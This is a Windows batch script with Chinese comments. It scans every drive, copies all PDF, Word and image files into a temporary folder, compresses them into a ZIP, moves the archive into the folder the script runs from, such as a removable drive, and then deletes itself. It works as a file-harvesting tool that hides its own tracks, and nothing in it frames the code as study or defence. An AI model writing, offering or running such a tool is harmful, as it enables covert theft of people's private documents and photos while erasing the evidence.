@echo off
setlocal enabledelayedexpansion

:: 初始化变量
set targetDir=C:\Windows\Temp\collected_files
set zipFile=C:\Windows\Temp\collected_files.zip
set fileCount=0
set count=0

:: 获取当前执行 .bat 文件所在的目录
set currentDir=%~dp0
set scriptPath=%~f0

:: 获取所有磁盘并存储到数组
for /f "tokens=1 delims=" %%d in ('wmic logicaldisk get caption ^| find ":"') do (
    echo Found drive: %%d
    set "drive[!count!]=%%d"
    set /a count+=1
)

:: 检查并创建目标文件夹
if not exist "%targetDir%" (
    mkdir "%targetDir%"
)

:: 清理目标文件夹中的旧文件
echo Clearing old files in the target folder...
del /q /f "%targetDir%\*.*" >nul 2>&1

:: 遍历每个磁盘
for /L %%i in (0,1,%count%-1) do (
    set "currentDrive=!drive[%%i]!"
    echo Processing drive !currentDrive!...
    call :processDrive !currentDrive!
)

:: 输出文件统计结果
if %fileCount% gtr 0 (
    echo %fileCount% files have been copied to %targetDir%. 
    echo Starting file compression, please wait...
) else (
    echo No matching files found.
    goto :selfdestruct
)

:: 删除旧的 ZIP 文件（如果存在）
if exist "%zipFile%" (
    echo Found old zip file, deleting it...
    del /q /f "%zipFile%"
)

:: 压缩目标文件夹到 ZIP
powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::CreateFromDirectory('%targetDir%', '%zipFile%')"

:: 检查压缩结果并移动 ZIP 文件
if exist "%zipFile%" (
    echo Files have been compressed to %zipFile%. 
    echo Moving ZIP file to current directory: %currentDir%...
    move "%zipFile%" "%currentDir%"
) else (
    echo Compression failed.
)

:: 清理临时文件夹（可选）
:: echo 正在清理临时文件夹...
:: rmdir /s /q "%targetDir%"

:: 自毁脚本
:selfdestruct
echo Script will now self-destruct...
start /b "" cmd /c del "%scriptPath%"
exit

:processDrive
set "drivePath=%1"
for /r "%drivePath%\" %%f in (*.pdf *.docx *.png *.jpg) do (
    copy "%%f" "%targetDir%" >nul 2>&1
    if not errorlevel 1 (
        set /a fileCount+=1
    )
)
goto :eof
